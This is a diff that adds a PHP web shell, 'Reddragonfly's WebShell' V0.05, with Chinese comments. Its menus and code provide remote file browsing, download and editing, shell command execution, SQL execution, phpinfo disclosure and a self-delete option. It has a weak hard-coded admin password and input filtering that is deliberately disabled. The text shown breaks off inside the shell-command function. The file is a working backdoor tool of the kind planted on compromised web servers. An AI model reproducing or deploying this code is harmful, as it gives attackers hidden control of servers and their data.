@@ -1,0 +1,1966 @@
+<?
+/*
+----+-------------------------------------------------------------+-----
+    |                                                             |
+    | Reddragonfly's WebShell                                     |
+    | http://www.reddragonfly.org                                 |
+    | -------------------------------                             |
+    | Email:phanrider@reddragonfly.org                            |
+    |                                                             |
+----+-------------------------------------------------------------+-----
+*/
+
+// 本程序参考了EasyWebshell和PHPWebshell部份代码和界面风格
+// 代码注释和框架主要引用了lion's的原代码风格
+// 在此对原创作者表示感谢
+
+
+
+$r_admin[title]        =  "Reddragonfly's WebShell";
+$r_admin[http]         =  "http://www.reddragonfly.org";
+$r_admin[b_name]       =  "Reddragonfly's WebShell";
+$r_admin[url]          =  @$_SERVER['PHP_SELF'];
+$r_admin[email]        =  "phanrider&#64reddragonfly.org";
+$r_admin[copyright]    =  "Copyright&copy; 2005 phanrider All Right Reserved.";
+$r_admin[version]      =  "V0.05";  
+$r_admin[t_time]       =  "2005-04-12"; 
+$r_admin[pathname]     =  "";
+$r_admin[pathname1]    =  "";
+$r_admin[r_dir]        =  "";                                //相对路径
+$r_admin[nowpath]      =  "";                                //绝对路径
+$r_admin[nowpath_attr] =  "";
+$r_admin[r_dirs]       =  ""; 
+$r_admin[truepath]     =  ""; 
+$r_admin[rootdir]      =  "";
+$r_admin[admin]        =  "admin";
+$r_admin[password]     =  "123456";
+$r_admin[pass]         =  "0";                             //session 认证无用时,用此认证  
+$r_admin[flag]         =  "1";                             //是否验证(0 不验证,1 验证) 
+$r_admin[session]      =  ""; 
+$r_admin[f_flag]       =  "0"; 
+session_start();
+set_time_limit(0);
+@set_magic_quotes_runtime(0);
+// ---------------------------------------------------------------------
+//
+// 输入处理及功能类
+//
+// ---------------------------------------------------------------------
+class FUNC 
+{
+
+    // ---------------------------------------------------------------------
+    //
+    // 分析递交的参数
+    //
+    // ---------------------------------------------------------------------
+    function getinput()
+    {
+        global $HTTP_GET_VARS, $HTTP_POST_VARS, $HTTP_CLIENT_IP, $REQUEST_METHOD;
+        global $REMOTE_ADDR, $HTTP_PROXY_USER, $HTTP_X_FORWARDED_FOR;
+
+        $return = array();
+
+        // ---------------------------------------------------------------------
+        // 取出GET的参数
+        // ---------------------------------------------------------------------
+        if( is_array($HTTP_GET_VARS) )
+        {
+    	    while( list($k, $v) = each($HTTP_GET_VARS) )
+			{
+                                //echo $k,$v;
+				//$k = $this->clean_key($k);
+				if( is_array($HTTP_GET_VARS[$k]) )
+				{
+					while( list($k2, $v2) = each($HTTP_GET_VARS[$k]) )
+					{
+						$return[$k][ $this->clean_key($k2) ] = $this->clean_value($v2);
+					}
+				}
+				else
+				{
+					$return[$k] = $this->clean_value($v);
+				}
+			}
+		}
+
+		// ---------------------------------------------------------------------
+		// 如果GET和POST存在相同的变量,用POST的值覆盖GET的值
+		// ---------------------------------------------------------------------
+		if( is_array($HTTP_POST_VARS) )
+		{
+			while( list($k, $v) = each($HTTP_POST_VARS) )
+			{
+			      //	 echo $k,$v;
+                                 //$k = $this->clean_key($k);
+				if ( is_array($HTTP_POST_VARS[$k]) )
+				{
+					while( list($k2, $v2) = each($HTTP_POST_VARS[$k]) )
+					{
+						$return[$k][ $this->clean_key($k2) ] = $this->clean_value($v2);
+					}
+				}
+				else
+				{
+					$return[$k] = $this->clean_value($v);
+				}
+			}
+		}
+
+		// ---------------------------------------------------------------------
+		// 取出访问者的IP地址
+		// ---------------------------------------------------------------------
+		$return['IP_ADDRESS'] = $this->select_var( array(
+														  1 => $_SERVER['REMOTE_ADDR'],
+														  2 => $HTTP_X_FORWARDED_FOR,
+														  3 => $HTTP_PROXY_USER,
+														  4 => $REMOTE_ADDR
+														)
+												 );
+
+		// ---------------------------------------------------------------------
+		// 取出有效的地址
+		// ---------------------------------------------------------------------
+		$return['IP_ADDRESS'] = preg_replace( "/^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})/", "\\1.\\2.\\3.\\4", $return['IP_ADDRESS'] );
+
+		$return['request_method'] = ( $_SERVER['REQUEST_METHOD'] != "" ) ? strtolower($_SERVER['REQUEST_METHOD']) : strtolower($REQUEST_METHOD);
+
+		return $return;
+	}
+
+	// ---------------------------------------------------------------------
+	//
+	// 清除有害的递交参数
+	//
+	// ---------------------------------------------------------------------
+    function clean_key($key)
+    {
+    	if ($key == "")
+    	{
+    		return "";
+    	}
+
+ //    	$key = preg_replace( "/\.\./"           , ""  , $key );
+ //   	$key = preg_replace( "/\_\_(.+?)\_\_/"  , ""  , $key );
+ // 	$key = preg_replace( "/^([\w\.\-\_]+)$/", "$1", $key );
+
+    	return $key;
+    }
+
+	// ---------------------------------------------------------------------
+	//
+	// 清除有害的递交参数值
+	//
+	// ---------------------------------------------------------------------
+    function clean_value($val)
+    {
+    	if ($val == "")
+    	{
+    		return "";
+    	}
+   	
+    	$val = stripslashes($val);                                     
+ 
+    	return $val;
+
+    }
+
+    // ---------------------------------------------------------------------
+    //
+    // 变量选择器
+    // 
+    // ---------------------------------------------------------------------
+    function select_var($array) {
+
+    	if ( !is_array($array) ) return -1;
+
+    	ksort($array);
+
+
+    	$chosen = -1;  // 如果没有数据可用,保证返回 0
+
+    	foreach ($array as $k => $v)
+    	{
+    		if (isset($v))
+    		{
+    			$chosen = $v;
+    			break;
+    		}
+    	}
+
+    	return $chosen;
+    }
+
+// ---------------------------------------------------------------------
+//
+// 可以加入其他函数
+//
+// ---------------------------------------------------------------------
+
+}   
+ 
+
+
+
+
+
+// ---------------------------------------------------------------------
+//
+// 常用函数
+//
+// ---------------------------------------------------------------------
+
+class WEB_SHELL
+{
+	var $input				= array();
+
+
+	
+	
+// ---------------------------------------------------------------------
+//
+// 用户检查
+//
+// ---------------------------------------------------------------------
+	
+	
+function check_logined()
+{
+	if (session_is_registered("r_admin['admin']") && session_is_registered("r_admin['password']"))
+	{
+		return true;
+	}
+	return false;
+}
+
+
+// ---------------------------------------------------------------------
+//
+// 用户检查
+//
+// ---------------------------------------------------------------------
+function checkadmin()
+{
+	global $r_admin;
+	$login = $this->input[login];
+	$username = $this->input[user_name];
+	$userpassword = $this->input[user_password];
+if ($login == "login")
+{         
+	if (isset($username) && isset($userpassword))
+	{
+
+                $r_admin[session] = @session_id();
+                $r_admin[admin] = md5($r_admin[admin]);
+                $r_admin['password'] = md5($r_admin['password']);
+		if (($username != $r_admin['admin']) || ($userpassword != $r_admin['password']) )
+		{
+		        $this->Redirect("输入的用户名或者密码错误!","1");
+			exit();
+              	}
+		else
+		{			
+
+			$password = $userpassword;
+                        $r_admin[pass] = "1";
+			session_register("r_admin['admin']");
+			session_register("r_admin['password']");
+                        echo $this->index();			
+
+		        return true;
+		}
+	}
+}
+
+
+}
+
+
+
+
+// 显示登陆信息函数
+function show_login()
+{
+	global $r_admin;
+        
+	$login = $this->input[login];
+        if ($login == "login") 	
+        $this->checkadmin();
+	else 
+        {
+       
+        $r_admin[url] = str_replace("//","/",$r_admin[url]);
+        $show_mess = "	
+<html>
+<head>
+<title>$r_admin[title]</title>
+<META http-equiv=Content-Type content='text/html; charset=gb2312'>
+<META content='$r_admin[title]' name=keywords>
+<LINK href=\"./rdstyle.css\" type=text/css rel=stylesheet>
+<SCRIPT language=JavaScript>
+function MD5(sMessage,elementName) {
+function RotateLeft(lValue, iShiftBits) { return (lValue<<iShiftBits) | (lValue>>>(32-iShiftBits)); }
+function AddUnsigned(lX,lY) {
+var lX4,lY4,lX8,lY8,lResult;
+lX8 = (lX & 0x80000000);
+lY8 = (lY & 0x80000000);
+lX4 = (lX & 0x40000000);
+lY4 = (lY & 0x40000000);
+lResult = (lX & 0x3FFFFFFF)+(lY & 0x3FFFFFFF);
+if (lX4 & lY4) return (lResult ^ 0x80000000 ^ lX8 ^ lY8);
+if (lX4 | lY4) {
+if (lResult & 0x40000000) return (lResult ^ 0xC0000000 ^ lX8 ^ lY8);
+else return (lResult ^ 0x40000000 ^ lX8 ^ lY8);
+} else return (lResult ^ lX8 ^ lY8);
+}
+function F(x,y,z) { return (x & y) | ((~x) & z); }
+function G(x,y,z) { return (x & z) | (y & (~z)); }
+function H(x,y,z) { return (x ^ y ^ z); }
+function I(x,y,z) { return (y ^ (x | (~z))); }
+function FF(a,b,c,d,x,s,ac) {
+a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b, c, d), x), ac));
+return AddUnsigned(RotateLeft(a, s), b);
+}
+function GG(a,b,c,d,x,s,ac) {
+a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b, c, d), x), ac));
+return AddUnsigned(RotateLeft(a, s), b);
+}
+function HH(a,b,c,d,x,s,ac) {
+a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b, c, d), x), ac));
+return AddUnsigned(RotateLeft(a, s), b);
+}
+function II(a,b,c,d,x,s,ac) {
+a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b, c, d), x), ac));
+return AddUnsigned(RotateLeft(a, s), b);
+}
+function ConvertToWordArray(sMessage) {
+var lWordCount;
+var lMessageLength = sMessage.length;
+var lNumberOfWords_temp1=lMessageLength + 8;
+var lNumberOfWords_temp2=(lNumberOfWords_temp1-(lNumberOfWords_temp1 % 64))/64;
+var lNumberOfWords = (lNumberOfWords_temp2+1)*16;
+var lWordArray=Array(lNumberOfWords-1);
+var lBytePosition = 0;
+var lByteCount = 0;
+while ( lByteCount < lMessageLength ) {
+lWordCount = (lByteCount-(lByteCount % 4))/4;
+lBytePosition = (lByteCount % 4)*8;
+lWordArray[lWordCount] = (lWordArray[lWordCount] | (sMessage.charCodeAt(lByteCount)<<lBytePosition));
+lByteCount++;
+}
+lWordCount = (lByteCount-(lByteCount % 4))/4;
+lBytePosition = (lByteCount % 4)*8;
+lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80<<lBytePosition);
+lWordArray[lNumberOfWords-2] = lMessageLength<<3;
+lWordArray[lNumberOfWords-1] = lMessageLength>>>29;
+return lWordArray;
+}
+function WordToHex(lValue) {
+var WordToHexValue=\"\",WordToHexValue_temp=\"\",lByte,lCount;
+for (lCount = 0;lCount<=3;lCount++) {
+lByte = (lValue>>>(lCount*8)) & 255;
+WordToHexValue_temp = \"0\" + lByte.toString(16);
+WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length-2,2);
+}
+return WordToHexValue;
+}
+var x=Array();
+var k,AA,BB,CC,DD,a,b,c,d
+var S11=7, S12=12, S13=17, S14=22;
+var S21=5, S22=9 , S23=14, S24=20;
+var S31=4, S32=11, S33=16, S34=23;
+var S41=6, S42=10, S43=15, S44=21;
+// Steps 1 and 2. Append padding bits and length and convert to words
+x = ConvertToWordArray(sMessage);
+// Step 3. Initialise
+a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476;
+// Step 4. Process the message in 16-word blocks
+for (k=0;k<x.length;k+=16) {
+AA=a; BB=b; CC=c; DD=d;
+a=FF(a,b,c,d,x[k+0], S11,0xD76AA478);
+d=FF(d,a,b,c,x[k+1], S12,0xE8C7B756);
+c=FF(c,d,a,b,x[k+2], S13,0x242070DB);
+b=FF(b,c,d,a,x[k+3], S14,0xC1BDCEEE);
+a=FF(a,b,c,d,x[k+4], S11,0xF57C0FAF);
+d=FF(d,a,b,c,x[k+5], S12,0x4787C62A);
+c=FF(c,d,a,b,x[k+6], S13,0xA8304613);
+b=FF(b,c,d,a,x[k+7], S14,0xFD469501);
+a=FF(a,b,c,d,x[k+8], S11,0x698098D8);
+d=FF(d,a,b,c,x[k+9], S12,0x8B44F7AF);
+c=FF(c,d,a,b,x[k+10],S13,0xFFFF5BB1);
+b=FF(b,c,d,a,x[k+11],S14,0x895CD7BE);
+a=FF(a,b,c,d,x[k+12],S11,0x6B901122);
+d=FF(d,a,b,c,x[k+13],S12,0xFD987193);
+c=FF(c,d,a,b,x[k+14],S13,0xA679438E);
+b=FF(b,c,d,a,x[k+15],S14,0x49B40821);
+a=GG(a,b,c,d,x[k+1], S21,0xF61E2562);
+d=GG(d,a,b,c,x[k+6], S22,0xC040B340);
+c=GG(c,d,a,b,x[k+11],S23,0x265E5A51);
+b=GG(b,c,d,a,x[k+0], S24,0xE9B6C7AA);
+a=GG(a,b,c,d,x[k+5], S21,0xD62F105D);
+d=GG(d,a,b,c,x[k+10],S22,0x2441453);
+c=GG(c,d,a,b,x[k+15],S23,0xD8A1E681);
+b=GG(b,c,d,a,x[k+4], S24,0xE7D3FBC8);
+a=GG(a,b,c,d,x[k+9], S21,0x21E1CDE6);
+d=GG(d,a,b,c,x[k+14],S22,0xC33707D6);
+c=GG(c,d,a,b,x[k+3], S23,0xF4D50D87);
+b=GG(b,c,d,a,x[k+8], S24,0x455A14ED);
+a=GG(a,b,c,d,x[k+13],S21,0xA9E3E905);
+d=GG(d,a,b,c,x[k+2], S22,0xFCEFA3F8);
+c=GG(c,d,a,b,x[k+7], S23,0x676F02D9);
+b=GG(b,c,d,a,x[k+12],S24,0x8D2A4C8A);
+a=HH(a,b,c,d,x[k+5], S31,0xFFFA3942);
+d=HH(d,a,b,c,x[k+8], S32,0x8771F681);
+c=HH(c,d,a,b,x[k+11],S33,0x6D9D6122);
+b=HH(b,c,d,a,x[k+14],S34,0xFDE5380C);
+a=HH(a,b,c,d,x[k+1], S31,0xA4BEEA44);
+d=HH(d,a,b,c,x[k+4], S32,0x4BDECFA9);
+c=HH(c,d,a,b,x[k+7], S33,0xF6BB4B60);
+b=HH(b,c,d,a,x[k+10],S34,0xBEBFBC70);
+a=HH(a,b,c,d,x[k+13],S31,0x289B7EC6);
+d=HH(d,a,b,c,x[k+0], S32,0xEAA127FA);
+c=HH(c,d,a,b,x[k+3], S33,0xD4EF3085);
+b=HH(b,c,d,a,x[k+6], S34,0x4881D05);
+a=HH(a,b,c,d,x[k+9], S31,0xD9D4D039);
+d=HH(d,a,b,c,x[k+12],S32,0xE6DB99E5);
+c=HH(c,d,a,b,x[k+15],S33,0x1FA27CF8);
+b=HH(b,c,d,a,x[k+2], S34,0xC4AC5665);
+a=II(a,b,c,d,x[k+0], S41,0xF4292244);
+d=II(d,a,b,c,x[k+7], S42,0x432AFF97);
+c=II(c,d,a,b,x[k+14],S43,0xAB9423A7);
+b=II(b,c,d,a,x[k+5], S44,0xFC93A039);
+a=II(a,b,c,d,x[k+12],S41,0x655B59C3);
+d=II(d,a,b,c,x[k+3], S42,0x8F0CCC92);
+c=II(c,d,a,b,x[k+10],S43,0xFFEFF47D);
+b=II(b,c,d,a,x[k+1], S44,0x85845DD1);
+a=II(a,b,c,d,x[k+8], S41,0x6FA87E4F);
+d=II(d,a,b,c,x[k+15],S42,0xFE2CE6E0);
+c=II(c,d,a,b,x[k+6], S43,0xA3014314);
+b=II(b,c,d,a,x[k+13],S44,0x4E0811A1);
+a=II(a,b,c,d,x[k+4], S41,0xF7537E82);
+d=II(d,a,b,c,x[k+11],S42,0xBD3AF235);
+c=II(c,d,a,b,x[k+2], S43,0x2AD7D2BB);
+b=II(b,c,d,a,x[k+9], S44,0xEB86D391);
+a=AddUnsigned(a,AA); b=AddUnsigned(b,BB); c=AddUnsigned(c,CC); d=AddUnsigned(d,DD);
+}
+
+var temp= WordToHex(a)+WordToHex(b)+WordToHex(c)+WordToHex(d);
+var element = eval(\"document.getElementsByName('\" + elementName + \"')[0]\");
+element.value = temp.toLowerCase();
+
+}
+</script>
+
+</head>
+			<center>
+			<table>
+			<tr>
+			<td><br><br><br><br><br><br><br><br><br><br><br><font face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">
+			<b>$r_admin[b_name] $r_admin[version]</b></font><br><br>
+				
+				用户名: <input type='text' name='user' size='16' class=input_basic onblur=\"return(MD5(document.getElementsByName('user')[0].value ,'user_name'));\"></input>
+				</td>
+			</tr>
+			<tr>
+				<td>
+				密&nbsp;&nbsp;码: <input type='password' name='password' size='16' class=input_basic onblur=\"return(MD5(document.getElementsByName('password')[0].value ,'user_password'));\"></input>
+				</td>
+			</tr>
+			<tr>
+				<td align=center>
+				<form action=\"$r_admin[url]?action=index&login=login\" method=\"post\" name=\"form1\">
+				<input type='submit' value='登陆' class=input_basic>
+				<input type='hidden' name='user_name' value=''>
+				<input type='hidden' name='user_password' value=''>
+				</form>
+				</td>
+			</tr>
+			
+			</table>
+			</center>
+		";
+		echo  $show_mess;
+		echo  $this->showfooter();
+	}	
+               return;		
+}
+
+
+// ---------------------------------------------------------------------
+//
+// 关于  
+//
+// ---------------------------------------------------------------------
+function about()
+{
+        global $r_admin;
+
+	$return  = $this->showhead($r_admin[b_name]);
+        $return .="
+<center>
+  <table width='580' height='395' border='0' class='input_basic'>
+    <tr>
+      <td colspan='2'><div align='center' class='title'><strong>$r_admin[b_name]&nbsp$r_admin[version] 说明文件</strong></div></td>
+    </tr>
+    <tr>
+      <td width='482'><strong>一、程序说明</strong></td>
+      <td width='88'>&nbsp;</td>
+    </tr>
+    <tr><td>
+该程序是一个小巧的功能齐全的网站WEB管理程序，可在线提供文件上传下载，编辑，添加删除，新建文件目录，SHELL功能，以及操作Mysql数据库
+    </td>
+      <td>&nbsp;</td>
+    </tr>
+   
+    <tr>
+      <td>&nbsp;</td>
+      <td>&nbsp;</td>
+    </tr>
+    <tr>
+      <td><strong>二、基本功能</strong></td>
+      <td>&nbsp;</td>
+    </tr>
+    <tr>
+      <td height='20'><p>1，文件和目录的新建或删除</p>
+        </td>
+      <td>&nbsp;</td>
+    </tr>
+    <tr>
+      <td>2，在线实现文件的上传和下载</td>
+      <td>&nbsp;</td>
+    </tr>
+    <tr>
+      <td>3，文件在线编辑功能</td>
+      <td>&nbsp;</td>
+    </tr>
+    <tr>
+      <td>4，SHELL和Mysql数据库的基本操作</td>
+      <td>&nbsp;</td>
+    </tr>
+    
+	<tr>
+      <td>5，PHP探针和信息</td>
+      <td>&nbsp;</td>
+    </tr>
+	<tr><td>&nbsp;</td></tr>
+	
+	<tr>
+		<td><b>三、版权说明</b></td>
+	</tr>
+		<tr>
+		<td>
+你可以自由传播、复制、更新，但我们不会担保本软件一定能满足用户的要求，也不担保软件不会出错或者有瑕疵，对软件是否适用于用户的电脑系统以及是否兼容用户现有的软件都不作担保。无论同意与否，由于使用本软件而产生的数据丢失、任何理论上或实际上的损失、可用性消失、商业中断，或任何形式的直接、间接、特殊、意外或必然的破坏，或任何他方的索赔，本软件作者概不负责。
+<br>****************************************************************************
+<br>请支持希望工程：
+<br>
+<br>如果你看到这些文字，正好手边又有手机的话，请跟我们做
+<br>a.拿出你的手机，写短信
+<br>b.请按入数字“2” 
+<br>c.发送到“8858”
+<br>d.我们将会和哪些得到你帮助孩子一起感谢您的爱心！
+<br>
+<br>****************************************************************************
+</td>
+</tr>
+<tr><td>&nbsp;</td></tr>
+	   
+    <tr>
+      <td><b>四、更新历史</b></td>
+      <td>&nbsp;</td>
+      
+    </tr>
+   <tr>
+      <td>2006-09-18  更新版本至V0.05</td>
+   </tr>
+   <tr>
+      <td>2006-01-05  更新版本至V0.03</td>
+   </tr>
+   <tr>
+      <td>2005-04-12  版本V0.01出世</td>
+      <td>&nbsp;</td>
+    </tr>
+
+    <tr>
+      <td height='22' colspan='2'><div align='center' class='style1'>声明：剑可防身也可伤人，风潇潇兮易水寒，壮士一去兮不复返！</div></td>
+    </tr>
+	<br>
+  </table>
+ 
+</center>
+
+";
+ 
+        $return .= $this->showfooter();
+         return $return;
+
+
+
+
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+// ---------------------------------------------------------------------
+//
+// 显示页头
+//
+// ---------------------------------------------------------------------
+function showhead($title)
+{
+	global $r_admin;
+        $return = $r_admin[style];
+        $return .= "
+<html>
+<head>
+<title>$title</title>
+<META http-equiv=Content-Type content='text/html; charset=gb2312'>
+<META content='红蜻蜓工作室' name=keywords>
+</head>
+<body bgcolor=#ffffff>  
+
+<center>
+<table width=\"600\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">
+<tr>
+<td>
+<br>
+			<p align='center'>
+			<font size=3 color=#000000 face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\"><b>$r_admin[title] $r_admin[version]</b></font>
+			<br>
+			</p>
+			<p align='center'>
+			<strong>
+			<font face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">
+				<a href='$r_admin[url]?action=fileman' title='文件管理'>文件管理</a> | 
+				<a href='$r_admin[url]?action=shell' title='执行命令'>执行命令</a> | 
+				<a href='$r_admin[url]?action=mysql' title='执行SQL'>执行SQL</a> |
+				<a href='$r_admin[url]?action=phpenv' title='PHP环境变量'>PHP环境变量</a> | 
+				<a href='$r_admin[url]?action=phpinfo1' title='PHPINFO'>PHPINFO</a> | 
+				<a href='$r_admin[url]?action=logout' title='注销登陆'>退出</a> |  
+				<a href='$r_admin[url]?action=selfremover' title='删除自身'>自删除</a> |  
+				<a href='$r_admin[url]?action=about' title='关于本程序'>关于</a>
+			</font>
+			</strong>
+			</p>
+
+</td>
+</tr>
+</table>
+</center>
+";
+
+    return $return;
+}
+
+
+
+
+// ---------------------------------------------------------------------
+//
+// 显示页尾
+//
+// ---------------------------------------------------------------------
+function showfooter()
+{
+	global $r_admin;
+    $date1 = date('Y');
+    $return .= "
+<br>
+<table width=\"600\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\">
+<tr><td>
+<p align=\"center\" class=\"9p\">
+<br><font color=#333399 face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\"><b><a href=\"$r_admin[http]\">
+$r_admin[title] $r_admin[version]</a></b></font><br>
+<font color=#000000 face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">Copyright &copy;
+2005 - $date1 Reddragonfly & Studio Code by </font>
+<a href=\"mailto:$r_admin[email]\">
+<font color=#000000 face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">phanrider</font></a> 
+</p>
+</td>
+</tr>
+</table>
+</body>
+</html>
+";
+        return $return;
+}
+
+    // ---------------------------------------------------------------------
+    //
+    // 让用户转向某一个页面
+    //
+    // ---------------------------------------------------------------------
+	function Redirect($Text, $Url)
+	{
+		global $r_admin;
+		$return  = $r_admin['style'];
+		$return .= "
+		
+<html>
+<head>
+<title>跳转页面</title>
+<meta http-equiv='refresh' content='2; url=$Url' />
+<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>
+<body>
+<table width='100%' height='85%' align='center'>
+<tr>
+<td valign='middle'>
+ <table align='center' cellpadding='4' class='tablefill'>
+  <tr>
+	<td width='100%' align='center' nowrap='nowrap' class=style1>
+	<font face=\"Verdana, Tahoma, Times New Roman, 宋体, MS Sans Serif\">
+	$Text</font><br /><br />
+	程序将带你到相关页面。 <br /><br />
+";
+	if ($Url == "1") {$return .="(如果你不想等待, <a href=\"javascript:history.go(-1);\">点这里返回</a>)";}
+	else {$return .="
+	(如果你不想等待, <a href='$Url'>请点这里。</a>)
+	";}
+	$return .="
+	</td>
+  </tr>
+ </table>
+</td>
+</tr>
+</table>
+</body>
+</html>
+";
+		echo $return;
+		exit();
+	}
+
+
+
+// ---------------------------------------------------------------------
+//
+// 一些计算函数
+//
+// ---------------------------------------------------------------------
+
+function getPath($mainpath, $relativepath) 
+{
+	global $r_admin;
+	$mainpath_info           = explode('/', $mainpath);
+	$relativepath_info       = explode('/', $relativepath);
+	$relativepath_info_count = count($relativepath_info);
+	for ($i=0; $i<$relativepath_info_count; $i++) 
+	{
+		if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
+		if ($relativepath_info[$i] == '..') 
+		{
+			$mainpath_info_count = count($mainpath_info);
+			unset($mainpath_info[$mainpath_info_count-1]);
+			continue;
+		}
+		$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
+	} //end for
+	return implode('/', $mainpath_info);
+	
+}
+
+
+
+function start_sh()
+{
+ 	global $r_admin,$style;
+        
+        $whereme=getcwd();	
+        if(@eregi("/",$whereme)){$r_admin[os]="unix";} else{$r_admin[os]="win";}
+ 	
+        $r_admin[pathname] = str_replace('\\\\','/',$_SERVER["DOCUMENT_ROOT"]);   //www服务路径
+        
+        $r_admin[pathname1] = str_replace('\\\\','/',dirname(__FILE__));   //该文件当前服务路径
+        
+       
+        $r_admin[rootdir] = $r_admin[pathname];
+        $r_admin[r_dir]=$this->input['dir'];
+
+        
+        // 获取当前路径
+        if (!isset($r_admin[r_dir]) or empty($r_admin[r_dir])) 
+        {
+          
+	$r_admin[r_dir] = ".";
+	
+	$r_admin[nowpath] = $this->getPath($r_admin[pathname1], $r_admin[r_dir]);
+        } 
+        else 
+        {
+        //	echo off;
+	$r_admin[r_dir]=$this->input['dir'];
+//	echo "test:$r_admin[r_dir]";
+	$r_admin[nowpath] = $this->getPath($r_admin[pathname1], $r_admin[r_dir]);
+	//echo $r_admin[nowpath];
+	if ($r_admin[nowpath] =="" or $r_admin[nowpath] ==".") { $r_admin[nowpath] = $r_admin[r_dir];} 
+        }
+        
+        $r_admin[nowpath_attr] = substr(base_convert(@fileperms($r_admin[nowpath]),10,8),-4);
+ //       echo $r_admin[nowpath];
+ 
+ 
+        $unabspath = ".";
+        
+        if(isset($abspath)) $r_admin[nowpath] = $this->gettruepath($r_admin[r_dir]);
+        else 
+        {
+       	if(isset($unabspath)) 
+       	 {
+        $r_admin[nowpath] = $this->gettruepath($r_admin[r_dir]);
+        $r_admin[r_dir]   = $this->gettruepath($r_admin[r_dir]);
+        if(@strstr($r_admin[r_dir],$r_admin[rootdir])) 
+        {
+        	$r_admin[r_dir] = @str_replace("$r_admin[rootdir]","",$r_admin[r_dir]);
+        	$r_admin[f_flag] = "0";
+        }
+        else {$r_admin[nowpath] =$r_admin[r_dir]; $r_admin[f_flag] = "1";}
+         }
+        }
+  
+
+if($this->input[downfile]) {
+ 
+// echo $this->input[downfile];
+
+if(isset($this->input['downfile'])){
+    if (!file_exists($this->input['downfile'])) $errordownload = "没找到文件"; 
+    else {
+        $df_name = basename($this->input['downfile']);
+	//$df_name = $this->input[downfile];
+	//echo $df_name;
+        $df_fhd=fopen($this->input[downfile],"rb");
+        if($df_fhd==false) $errordownload = "打开文件错误";
+        else{
+            Header("Content-type: application/octet-stream");
+            Header("Accept-Ranges: bytes");
+            Header("Accept-Length: ".filesize($this->input[downfile]));
+            Header("Content-Disposition: attachment; filename=".$df_name);
+	    echo fread($df_fhd,filesize($this->input[downfile]));
+            fclose($df_fhd);
+            exit;
+        }
+    } 
+}
+         $this->Redirect("$errordownload", $r_admin[url]);
+}
+
+
+
+
+echo "$style";
+
+}
+
+
+
+// ---------------------------------------------------------------------
+//
+// PHPINFO函数
+//
+// ---------------------------------------------------------------------
+function phpinfo1()
+{
+  
+       	global $r_admin;
+        $return  = $this->showhead($r_admin[b_name]);
+        $return .="   
+
+  <br>
+<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center' style=\"TABLE-LAYOUT: fixed; WORD-BREAK: break-all\">
+  <tr bgcolor='#cccccc'>
+       <td>
+        PHPINFO 	
+       </td>
+   </tr>
+	       
+	<td align=\"center\" bgcolor=\"#EEEEEE\" class=\"stylebtext2\"><br>
+"; 
+        echo $return; 
+	phpinfo();
+	if(eregi("phpinfo",get_cfg_var("disable_functions"))) 
+        $return1 ="<b>phpinfo函数被禁止</b><br>";
+	$return1 .="	
+          </td>
+	 	</table>
+";
+        $return1 .= $this->showfooter();
+        echo $return1;
+	return ; 
+}
+
+
+
+
+
+
+
+
+
+// ---------------------------------------------------------------------
+//
+// 编辑文件 
+//
+// ---------------------------------------------------------------------
+function editfile()
+{
+        global $r_admin;
+      
+       	$this->input['dir'] = str_replace("//","/",$this->input['dir']);
+      	$return  = $this->showhead($r_admin[b_name]);
+      	$return .="
+
+  <br>
+<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center'>
+  <tr bgcolor='#cccccc'>
+       <td>
+	文本编辑器(若目标文件不存在将新建新文件)
+       </td>
+   </tr>
+	<form method='post' action=\"?action=savefile&dir=".urlencode($this->input['dir'])."\" enctype='multipart/form-data'>
+		<td align=center valign=top bgcolor='EEEEEE'>当前编辑文件名:
+			<input name=\"editfilename\" type=\"text\" class=\"style1\" value='".$this->input['dir']."' size=30>
+			<input name=\"editbackfile\" type=\"checkbox\" value=1 class=\"style1\">生成备份文件(原文件.bak)<br>
+			<textarea name=\"editfiletext\" cols=80 rows=20 class=\"style1\">
+";
+				$cur_dir = urlencode(dirname($this->input['dir']));
+				$fd = @fopen($this->input['dir'], "rb");
+				$fd==false?$readfbuff = "读取文件错误(或尚未读取文件).":$readfbuff = @fread($fd, filesize($this->input['dir']));
+				@fclose( $fd );
+				$readfbuff = htmlspecialchars($readfbuff);
+       			$return .=$readfbuff;
+$return .="			
+                        </textarea><p>
+			<input name=\"editfileb\" type=\"submit\" value=\"提交\">&nbsp;&nbsp;
+			<input name=\"editagainb\" type=\"reset\" value=\"重置\">
+			<a href=\"$r_admin[url]?dir=$cur_dir\">点此返回文件浏览页面</a>
+			<p>
+		</td>
+	</form>
+        </table>
+";
+
+        $return .= $this->showfooter();
+        return $return;
+}
+
+
+// ---------------------------------------------------------------------
+//
+// shell 
+//
+// ---------------------------------------------------------------------
+function shell()
+{
+      global $r_admin;
+      $shellcmd = $this->input['shellcmd'];
+      $seletefunc = $this->input['seletefunc'];
+ 
+      $return  = $this->showhead($r_admin[b_name]);
+      $return .="
+  <br>
+<table width='600' border='0' cellpadding='3' cellspacing='1' bgcolor='#ffffff' class='input_basic' align='center'>
+  <tr bgcolor='#cccccc'>
+     <td>
+        SHELL 命令
+       </td>
+   </tr>
+		<form method=\"post\" action=\"?action=shell\" enctype=\"multipart/form-data\">
